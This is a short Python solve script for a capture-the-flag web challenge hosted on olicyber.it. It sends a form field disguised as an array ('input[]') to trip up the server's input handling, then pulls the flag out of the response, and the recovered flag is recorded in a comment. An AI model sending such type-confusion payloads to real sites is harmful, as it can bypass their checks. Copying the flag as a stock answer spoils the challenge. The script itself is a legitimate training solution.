import requests
import re

site = "http://soundofsilence.challs.olicyber.it/"

data = {
    "input[]" : ""
}

r = requests.post(site, data = data).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{w0w_you_jus7_found_the_s0und_of_silenc3!}
